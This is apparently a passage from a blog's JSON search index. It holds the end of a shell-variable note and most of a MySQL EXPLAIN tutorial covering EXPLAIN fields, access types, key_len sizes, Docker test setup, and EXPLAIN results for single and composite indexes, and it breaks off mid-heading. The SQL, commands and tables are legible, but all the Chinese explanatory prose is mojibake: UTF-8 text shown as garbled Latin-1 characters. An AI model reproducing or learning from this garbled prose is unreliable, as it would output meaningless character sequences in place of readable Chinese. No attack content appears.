is\nset_nodeid3 is 1234\n```\n\n\n\nç¬¬ä¸€ç§æ–¹å¼åˆ›å»ºäº†å­shell, èµ‹å€¼æ˜¯å­shellçš„, æ²¡æœ‰å½±å“åˆ°å…¨å±€å˜é‡.\n\nç¬¬äºŒç§æ–¹å¼, forå¾ªç¯çš„æ–¹å¼, å› ä¸ºa.confä¸­é—´ç©ºæ ¼å¯¼è‡´çš„,æŠŠä¸€è¡Œå¾ªç¯äº†ä¸¤æ¬¡, æ‰€ä»¥èµ‹å€¼äº†ç©º\n\nç¬¬ä¸‰ç§æ–¹å¼å¾—åˆ°æ­£ç¡®çš„ç»“æœ\n\n","tags":["shell"],"categories":["å‘½ä»¤"]},{"title":"mysqlç”¨explainæŸ¥çœ‹æ‰§è¡Œè®¡åˆ’","url":"%2Fp%2F8a4c23bd.html","content":"\nmysql ä½¿ç”¨ `explain + sql è¯­å¥` æ¥æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ï¼Œæ‰§è¡Œç»“æœæœ‰ä»¥ä¸‹å­—æ®µï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š\n\n<!-- more -->\n\n\n# 1. å­—æ®µè¯´æ˜\n\n| å­—æ®µ          | æè¿°                                                         |\n| :------------ | :----------------------------------------------------------- |\n| id            | idç›¸åŒï¼Œæ‰§è¡Œé¡ºåºç”±ä¸Šè‡³ä¸‹ï¼›<br/>idä¸åŒï¼Œidçš„åºå·ä¼šé€’å¢ï¼Œidå€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ï¼Œè¶Šå…ˆè¢«æ‰§è¡Œ<br/>idä¸º`null`æ—¶è¡¨ç¤ºä¸€ä¸ªç»“æœé›†ï¼Œä¸éœ€è¦ä½¿ç”¨å®ƒæŸ¥è¯¢ï¼Œå¸¸å‡ºç°åœ¨åŒ…å«`union`ç­‰æŸ¥è¯¢è¯­å¥ä¸­ã€‚ |\n| select_type   | ä¸»è¦æ˜¯ç”¨äºåŒºåˆ«æ™®é€šæŸ¥è¯¢ã€è”åˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ç­‰çš„å¤æ‚æŸ¥è¯¢         |\n| table         | å½“å‰æ‰§è¡Œçš„è¡¨                                                 |\n| type          | è®¿é—®ç±»å‹                                                     |\n| possible_keys | å¯èƒ½ä½¿ç”¨çš„ç´¢å¼•                                               |\n| key           | å®é™…ä½¿ç”¨çš„ç´¢å¼•                                               |\n| key_len       | ä½¿ç”¨çš„ç´¢å¼•çš„é•¿åº¦                                             |\n| ref           | æ˜¾ç¤ºç´¢å¼•çš„å“ªä¸€åˆ—è¢«ä½¿ç”¨äº†                                     |\n| rows          | æŸ¥è¯¢è¿‡ç¨‹ä¸­ä¼°è®¡è¦æ‰«æçš„è¡Œæ•°, åŸåˆ™ä¸Š rows è¶Šå°‘è¶Šå¥½.            |\n| Extra         | è§£ææŸ¥è¯¢çš„é¢å¤–ä¿¡æ¯ï¼Œé€šå¸¸ä¼šæ˜¾ç¤ºæ˜¯å¦ä½¿ç”¨äº†ç´¢å¼•ï¼Œæ˜¯å¦éœ€è¦æ’åºï¼Œæ˜¯å¦ä¼šç”¨åˆ°ä¸´æ—¶è¡¨ç­‰ |\n| partitions    | åŒ¹é…çš„åˆ†åŒº                                                   |\n| filtered      | è¿™ä¸ªå­—æ®µè¡¨ç¤ºå­˜å‚¨å¼•æ“è¿”å›çš„æ•°æ®åœ¨serverå±‚è¿‡æ»¤åï¼Œå‰©ä¸‹å¤šå°‘æ»¡è¶³æŸ¥è¯¢çš„è®°å½•æ•°é‡çš„æ¯”ä¾‹ï¼Œæ³¨æ„æ˜¯ç™¾åˆ†æ¯”ï¼Œä¸æ˜¯å…·ä½“è®°å½•æ•°ã€‚ |\n\n### 1.1 select_type\n\n| ç±»å‹               | è§£é‡Š                                                         |\n| ------------------ | ------------------------------------------------------------ |\n| SIMPLE             | ä¸åŒ…å« UNION æŸ¥è¯¢æˆ–å­æŸ¥è¯¢                                    |\n| PRIMARY            | åŒ…å«å­æŸ¥è¯¢æœ€å¤–å±‚æŸ¥è¯¢å°±æ˜¾ç¤ºä¸º `PRIMARY`                       |\n| SUBQUERY           | å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ª SELECT                                      |\n| DEPENDENT SUBQUERY | å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ª SELECT, å–å†³äºå¤–é¢çš„æŸ¥è¯¢. å³å­æŸ¥è¯¢ä¾èµ–äºå¤–å±‚æŸ¥è¯¢çš„ç»“æœ. |\n| UNION              | UNION çš„ç¬¬äºŒæˆ–éšåçš„æŸ¥è¯¢                                     |\n| DEPENDENT UNION    | UNION ä¸­çš„ç¬¬äºŒä¸ªæˆ–åé¢çš„æŸ¥è¯¢è¯­å¥, å–å†³äºå¤–é¢çš„æŸ¥è¯¢           |\n| UNION RESULT       | UNION çš„ç»“æœ                                                 |\n\n\n\n\n### 1.2 type\n\n`type` å­—æ®µæ¯”è¾ƒé‡è¦, å®ƒæä¾›äº†åˆ¤æ–­æŸ¥è¯¢æ˜¯å¦é«˜æ•ˆçš„é‡è¦ä¾æ®ä¾æ®. é€šè¿‡ `type` å­—æ®µ, æˆ‘ä»¬åˆ¤æ–­æ­¤æ¬¡æŸ¥è¯¢æ˜¯ `å…¨è¡¨æ‰«æ` è¿˜æ˜¯ `ç´¢å¼•æ‰«æ` ç­‰\n\nä»ä¸Šåˆ°ä¸‹æ€§èƒ½ä»ä½åˆ°é«˜æ’åˆ—:\n\n+ all\n\n  è¡¨ç¤ºå…¨è¡¨æ‰«æ, è¿™ä¸ªç±»å‹çš„æŸ¥è¯¢æ˜¯æ€§èƒ½æœ€å·®çš„æŸ¥è¯¢ä¹‹ä¸€. é€šå¸¸æ¥è¯´, æˆ‘ä»¬çš„æŸ¥è¯¢ä¸åº”è¯¥å‡ºç° ALL ç±»å‹çš„æŸ¥è¯¢, å› ä¸ºè¿™æ ·çš„æŸ¥è¯¢åœ¨æ•°æ®é‡å¤§çš„æƒ…å†µä¸‹, å¯¹æ•°æ®åº“çš„æ€§èƒ½æ˜¯å·¨å¤§çš„ç¾éš¾. å¦‚ä¸€ä¸ªæŸ¥è¯¢æ˜¯ ALL ç±»å‹æŸ¥è¯¢, é‚£ä¹ˆä¸€èˆ¬æ¥è¯´å¯ä»¥å¯¹ç›¸åº”çš„å­—æ®µæ·»åŠ ç´¢å¼•æ¥é¿å….\n\n+ index\n\n  è¡¨ç¤ºå…¨ç´¢å¼•æ‰«æ(full index scan), å’Œ ALL ç±»å‹ç±»ä¼¼, åªä¸è¿‡ ALL ç±»å‹æ˜¯å…¨è¡¨æ‰«æ, è€Œ index ç±»å‹åˆ™ä»…ä»…æ‰«ææ‰€æœ‰çš„ç´¢å¼•, è€Œä¸æ‰«ææ•°æ®.\n\n  `index` ç±»å‹é€šå¸¸å‡ºç°åœ¨: æ‰€è¦æŸ¥è¯¢çš„æ•°æ®ç›´æ¥åœ¨ç´¢å¼•æ ‘ä¸­å°±å¯ä»¥è·å–åˆ°, è€Œä¸éœ€è¦æ‰«ææ•°æ®. å½“æ˜¯è¿™ç§æƒ…å†µæ—¶, Extra å­—æ®µ ä¼šæ˜¾ç¤º `Using index`.\n\n  ```sql\n  EXPLAIN SELECT name FROM  user_info\n  ```\n\n+ range\n\n  è¡¨ç¤ºä½¿ç”¨ç´¢å¼•èŒƒå›´æŸ¥è¯¢, é€šè¿‡ç´¢å¼•å­—æ®µèŒƒå›´è·å–è¡¨ä¸­éƒ¨åˆ†æ•°æ®è®°å½•. è¿™ä¸ªç±»å‹é€šå¸¸å‡ºç°åœ¨ =, <>, >, >=, <, <=, IS NULL, <=>, BETWEEN, IN() æ“ä½œä¸­.\n  å½“ `type` æ˜¯ `range` æ—¶, é‚£ä¹ˆ EXPLAIN è¾“å‡ºçš„ `ref` å­—æ®µä¸º NULL, å¹¶ä¸” `key_len` å­—æ®µæ˜¯æ­¤æ¬¡æŸ¥è¯¢ä¸­ä½¿ç”¨åˆ°çš„ç´¢å¼•çš„æœ€é•¿çš„é‚£ä¸ª.\n\n+ index_merge\n\n+ ref\n\n  æ­¤ç±»å‹é€šå¸¸å‡ºç°åœ¨å¤šè¡¨çš„ join æŸ¥è¯¢, é’ˆå¯¹äºéå”¯ä¸€æˆ–éä¸»é”®ç´¢å¼•, æˆ–è€…æ˜¯ä½¿ç”¨äº† `æœ€å·¦å‰ç¼€` è§„åˆ™ç´¢å¼•çš„æŸ¥è¯¢.\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id AND order_info.user_id = 5\n  ```\n\n+ eq_ref\n\n  æ­¤ç±»å‹é€šå¸¸å‡ºç°åœ¨å¤šè¡¨çš„ join æŸ¥è¯¢, è¡¨ç¤ºå¯¹äºå‰è¡¨çš„æ¯ä¸€ä¸ªç»“æœ, éƒ½åªèƒ½åŒ¹é…åˆ°åè¡¨çš„ä¸€è¡Œç»“æœ. å¹¶ä¸”æŸ¥è¯¢çš„æ¯”è¾ƒæ“ä½œé€šå¸¸æ˜¯ `=`, æŸ¥è¯¢æ•ˆç‡è¾ƒé«˜. ä¾‹å¦‚:\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id\n  ```\n\n+ const \n\n  é’ˆå¯¹ä¸»é”®æˆ–å”¯ä¸€ç´¢å¼•çš„ç­‰å€¼æŸ¥è¯¢æ‰«æ, æœ€å¤šåªè¿”å›ä¸€è¡Œæ•°æ®. const æŸ¥è¯¢é€Ÿåº¦éå¸¸å¿«, å› ä¸ºå®ƒä»…ä»…è¯»å–ä¸€æ¬¡å³å¯.\n\n  ä¾‹å¦‚ä¸‹é¢çš„è¿™ä¸ªæŸ¥è¯¢, å®ƒä½¿ç”¨äº†ä¸»é”®ç´¢å¼•, å› æ­¤ `type` å°±æ˜¯ `const` ç±»å‹çš„.\n\n  ```sql\n  explain select * from user_info where id = 2\n  ```\n\n+ system\n\n  è¡¨ä¸­åªæœ‰ä¸€æ¡æ•°æ®. è¿™ä¸ªç±»å‹æ˜¯ç‰¹æ®Šçš„ `const` ç±»å‹.\n  \n  \n\n`ALL` ç±»å‹å› ä¸ºæ˜¯å…¨è¡¨æ‰«æ, å› æ­¤åœ¨ç›¸åŒçš„æŸ¥è¯¢æ¡ä»¶ä¸‹, å®ƒæ˜¯é€Ÿåº¦æœ€æ…¢çš„.\nè€Œ `index` ç±»å‹çš„æŸ¥è¯¢è™½ç„¶ä¸æ˜¯å…¨è¡¨æ‰«æ, ä½†æ˜¯å®ƒæ‰«æäº†æ‰€æœ‰çš„ç´¢å¼•, å› æ­¤æ¯” ALL ç±»å‹çš„ç¨å¿«.\nåé¢çš„å‡ ç§ç±»å‹éƒ½æ˜¯åˆ©ç”¨äº†ç´¢å¼•æ¥æŸ¥è¯¢æ•°æ®, å› æ­¤å¯ä»¥è¿‡æ»¤éƒ¨åˆ†æˆ–å¤§éƒ¨åˆ†æ•°æ®, å› æ­¤æŸ¥è¯¢æ•ˆç‡å°±æ¯”è¾ƒé«˜äº†.\n\n\n\n### 1.3 key_len\n\nè¡¨ç¤ºæŸ¥è¯¢ä¼˜åŒ–å™¨ä½¿ç”¨äº†ç´¢å¼•çš„å­—èŠ‚æ•°. è¿™ä¸ªå­—æ®µå¯ä»¥è¯„ä¼°ç»„åˆç´¢å¼•æ˜¯å¦å®Œå…¨è¢«ä½¿ç”¨, æˆ–åªæœ‰æœ€å·¦éƒ¨åˆ†å­—æ®µè¢«ä½¿ç”¨åˆ°.\nkey_len çš„è®¡ç®—è§„åˆ™å¦‚ä¸‹:\n\n- å­—ç¬¦ä¸²\n  - char(n): n å­—èŠ‚é•¿åº¦\n  - varchar(n): å¦‚æœæ˜¯ utf8 ç¼–ç , åˆ™æ˜¯ 3 *n + 2å­—èŠ‚; å¦‚æœæ˜¯ utf8mb4 ç¼–ç , åˆ™æ˜¯ 4* n + 2 å­—èŠ‚.\n- æ•°å€¼ç±»å‹:\n  - TINYINT: 1å­—èŠ‚\n  - SMALLINT: 2å­—èŠ‚\n  - MEDIUMINT: 3å­—èŠ‚\n  - INT: 4å­—èŠ‚\n  - BIGINT: 8å­—èŠ‚\n- æ—¶é—´ç±»å‹\n  - DATE: 3å­—èŠ‚\n  - TIMESTAMP: 4å­—èŠ‚\n  - DATETIME: 8å­—èŠ‚\n- å­—æ®µå±æ€§: NULL å±æ€§ å ç”¨ä¸€ä¸ªå­—èŠ‚. å¦‚æœä¸€ä¸ªå­—æ®µæ˜¯ NOT NULL çš„, åˆ™æ²¡æœ‰æ­¤å±æ€§.\n\n\n\n### 1.4 Extra\n\n+ Using filesort\n  å½“ Extra ä¸­æœ‰ Using filesort æ—¶, è¡¨ç¤º MySQL éœ€é¢å¤–çš„æ’åºæ“ä½œ, ä¸èƒ½é€šè¿‡ç´¢å¼•é¡ºåºè¾¾åˆ°æ’åºæ•ˆæœ. è¡¨æ˜æ­¤æ—¶çš„æŸ¥è¯¢æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆæ’åºæ“ä½œå³ç´¢å¼•å¤±æ•ˆã€‚\n\n+ Using index\n\n  \"è¦†ç›–ç´¢å¼•æ‰«æ\", è¡¨ç¤ºæŸ¥è¯¢åœ¨ç´¢å¼•æ ‘ä¸­å°±å¯æŸ¥æ‰¾æ‰€éœ€æ•°æ®, ä¸ç”¨æ‰«æè¡¨æ•°æ®æ–‡ä»¶, å¾€å¾€è¯´æ˜æ€§èƒ½ä¸é”™\n\n+ Using temporary\n\n  æŸ¥è¯¢æœ‰ä½¿ç”¨ä¸´æ—¶è¡¨, ä¸€èˆ¬å‡ºç°äºæ’åº, åˆ†ç»„å’Œå¤šè¡¨ join çš„æƒ…å†µ, æŸ¥è¯¢æ•ˆç‡ä¸é«˜, å»ºè®®ä¼˜åŒ–.\n\n\n\n# 2. æµ‹è¯•\n\n```bash\ndocker run -d --name mysql-explain -e MYSQL_ROOT_PASSWORD=123456 mysql # åˆ›å»ºä¸€ä¸ªå®¹å™¨\n\ndocker exec -it mysql-explain mysql -u root -p  # è¾“å…¥å¯†ç , è¿›å…¥æ“ä½œ\n```\n\n\n\n### 2.1 æ•°æ®åˆå§‹åŒ–\n\næ–°å»ºæµ‹è¯•è¡¨ï¼Œæ’å…¥ 10w æ•°æ®ï¼š\n\n```sql\n-- åˆ›å»ºåº“\nCREATE DATABASE test1;\nuse test1;\n\n-- åˆ›å»ºè¡¨\nCREATE TABLE `test` (  \n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `a` int(11) NOT NULL,\n  `b` int(11) NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n\n-- æ‰¹é‡æ’å…¥ 10w æ•°æ®\nDROP PROCEDURE IF EXISTS batchInsert;\nDELIMITER $  \nCREATE PROCEDURE batchInsert() BEGIN DECLARE i INT DEFAULT 1;  \nSTART TRANSACTION; WHILE i<=100000  \nDO  \nINSERT INTO test (a,b) VALUES (i,i);  \nSET i=i+1; END WHILE;  \nCOMMIT; END $\n\nCALL batchInsert();  \n\n\n-- å¾—åˆ°100000\nselect count(*) from test;\n```\n\n\n\n### 2.2 æ²¡æœ‰ç´¢å¼•\n\nç›®å‰é»˜è®¤åªæœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼•ï¼Œæˆ‘ä»¬åˆ†æä¸‹å…¨è¡¨æŸ¥è¯¢ï¼š\n\n```sql\nexplain select * from test;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra | partitions | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---- | ---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | NULL          | NULL | NULL    | NULL | 100098 | NULL  | NULL       | 100.00   |\n\nå…¶ä¸­ `type` å€¼ä¸º ALLï¼Œè¡¨ç¤ºå…¨è¡¨æ‰«æäº†ï¼Œæˆ‘ä»¬çœ‹åˆ° `rows` è¿™ä¸ªå­—æ®µæ˜¾ç¤ºæœ‰ 100098 æ¡ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¸€å…±æ‰ 10w æ¡æ•°æ®ï¼Œè¯´æ˜è¿™ä¸ªå­—æ®µåªæ˜¯ mysql çš„ä¸€ä¸ªé¢„ä¼°ï¼Œä¸æ€»æ˜¯å‡†ç¡®çš„ã€‚\n\n\n\n### 2.3 å•ä¸ªå­—æ®µç´¢å¼•\n\næˆ‘ä»¬ç»™å­—æ®µ a æ·»åŠ æ™®é€šç´¢å¼•ã€‚\n\n```sql\nalter table test add index idx_a(a);  \n```\n\n\n\n##### 2.3.1 where ç´¢å¼•\n\n+ èµ° a ç´¢å¼•æ ‘,  è™½1è¡Œä¹Ÿè¦å›è¡¨ã€‚\n\n```sql\nexplain select * from test where a = 10000;     \n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a         | idx_a | 4       | const | 1    | NULL  | 100      |\n\n\n\n+ ä¸èµ°ç´¢å¼•, å› ä¸ºè¿™æ¡è¯­å¥ä¼šä»ç´¢å¼•ä¸­æŸ¥å‡º 9w æ¡æ•°æ®ï¼Œå…¨è¡¨æ‰«æéƒ½æ‰ 10w æ¡æ•°æ®ï¼Œæ‰€ä»¥ mysql å†³ç­–æ˜¯è¿˜ä¸å¦‚ç›´æ¥å…¨è¡¨æ‰«æå¾—äº†ã€‚\n\n```sql\nexplain select * from test where a > 10000;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50.00    |\n\n\n\n+ ä½¿ç”¨äº† a ç´¢å¼•æ ‘, å› ä¸ºæ»¡è¶³ç´¢å¼•åªæœ‰ 10000 æ¡æ•°æ®ï¼Œmysql è®¤ä¸º 10000 æ¡æ•°æ®å°±ç®—å›è¡¨ä¹Ÿè¦æ¯”å…¨è¡¨æ‰«æçš„ä»£ä»·ä½ï¼Œå› è€Œå†³å®šæŸ¥ç´¢å¼•ï¼Œä½†è¿˜æ˜¯éœ€è¦å›è¡¨ã€‚\n\n```sql\nexplain select * from test where a > 90000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ åªselect ç´¢å¼•å­—æ®µ, æ³¨æ„è¿™æ¬¡ Extra çš„å€¼ä¸º `Using where; Using index`ï¼Œè¡¨ç¤ºæŸ¥è¯¢ç”¨åˆ°äº†ç´¢å¼•ï¼Œä¸”è¦æŸ¥è¯¢çš„å­—æ®µåœ¨ç´¢å¼•ä¸­å°±èƒ½æ‹¿åˆ°ï¼Œæ‰€ä»¥ä¸éœ€è¦å›è¡¨ã€‚æ˜¾ç„¶è¿™ç§æ•ˆç‡æ¯”ä¸Šé¢çš„è¦é«˜ï¼Œè¿™ä¹Ÿæ˜¯æ—¥å¸¸å¼€å‘ä¸­ä¸å»ºè®®å†™ select * çš„åŸå› ï¼Œå°½é‡åªæŸ¥è¯¢ä¸šåŠ¡æ‰€éœ€çš„å­—æ®µã€‚\n\n```sql\nexplain select a from test where a > 10000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100.00   |\n\n\n\n##### 2.3.2 order by ç´¢å¼•\n\norder by æœ€å¥½å’Œ where ç”¨åŒä¸€ä¸ªå­—æ®µ\n\n\n\n+ èµ° a ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using where; Using index | 100.00   |\n\n\n\n+ èµ° a ç´¢å¼•æ ‘, éœ€è¦å›è¡¨\n\n```sql\nexplain select * from test where a > 90000 order by a;\nexplain select b from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ Extraä¸­è¿”å›äº†ä¸€ä¸ª Using filesortï¼Œè¯´æ˜æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆæ’åºï¼Œéœ€è¦ä»å†…å­˜æˆ–ç£ç›˜è¿›è¡Œæ’åºã€‚å°±ç®— b æœ‰ç´¢å¼•, ä¹Ÿæ— æ³•é¿å…, å› ä¸ºä¹Ÿä¼šèµ° a çš„ç´¢å¼•æ ‘ã€‚\n\n```Â sql\nexplain select a from test where a > 90000 order by b;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :------------------------------------ | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition; Using filesort | 100.00   |\n\n\n\n### 2.4 å¤šä¸ªå­—æ®µç´¢å¼•å’Œå¤åˆç´¢å¼•\n\n##### 2.4.1 å¤šä¸ªå­—æ®µç´¢å¼•\n\nç›®å‰a, b æœ‰è‡ªå·±çš„å•ä¸ªç´¢å¼•ã€‚\n\n```sql\nalter table test drop index idx_a_b;\nalter table test add index idx_a(a);  \nalter table test add index idx_b(b);\n```\n\n\n+ æ²¡èµ°ç´¢å¼•,æ˜¯å› ä¸ºæ— è®ºå¦‚ä½•éƒ½éœ€è¦å›è¡¨, å¦‚æœæŠŠ10000æ”¹æˆ90000, ä¼šå˜æˆèµ°ç´¢å¼•åŠ å›è¡¨.\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50       |\n\n\n\n+ ç›´æ¥èµ°a çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ èµ° b çš„ç´¢å¼•æ ‘æ›´å¥½,å›è¡¨\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_b | 4       | const | 1    | Using where | 9.99     |\n\n\n\n+ èµ° a çš„ç´¢å¼•æ ‘æ›´å¥½,å›è¡¨\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_a | 4       | const | 1    | Using where | 9.99     |\n\n\n\n##### 2.4.2 ä¸€ä¸ªå¤åˆç´¢å¼•\n\n```sql\nalter table test drop index idx_a;\nalter table test drop index idx_b;\nalter table test add index idx_a_b(a,b);  \n```\n\nç›®å‰åªæœ‰ä¸€ä¸ª(a,b)å¤åˆç´¢å¼•\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ ä¸æ»¡è¶³æœ€å·¦åŒ¹é…åŸåˆ™\n\n```sql\nexplain select * from test where b > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows   | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :----- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | index | NULL          | idx_a_b | 8       | NULL | 100098 | Using where; Using index | 33.33    |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨, key_len=4\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 18142 | Using where; Using index | 10       |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨, key_len=8\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n\n\n##### 2.4.3 æ™®é€šç´¢å¼•å’Œå¤åˆç´¢å¼•åŒæ—¶å­˜åœ¨\n\n```sql\nalter table test add index idx_a(a); \nalter table test add index idx_b(b);  \nalter table test add index idx_a_b(a,b);  \n```\n\nç›®å‰æœ‰2ä¸ªæ™®é€šç´¢å¼•,1ä¸ªå¤åˆç´¢å¼•. \n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘æ›´å¥½, ä¸å›è¡¨\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ èµ° a çš„ç´¢å¼•æ ‘æ›´å¥½, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ èµ° b çš„ç´¢å¼•æ ‘,  éœ€è¦å›è¡¨. å…¶å®æ­¤æ—¶èµ°å¤åˆç´¢å¼•æ›´å¥½, æ‰€ä»¥ä¸å»ºè®®å¤åˆç´¢å¼•å’Œæ™®é€šç´¢å¼•ä¸€èµ·ç”¨\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys       | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a_b,idx_a,idx_b | idx_b | 4       | const | 1    | Using where | 18.12    |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys       | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a,idx_b | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n##### 2.4.4  å¤åˆç´¢å¼•å’Œå•ä¸ªç´¢å¼•å 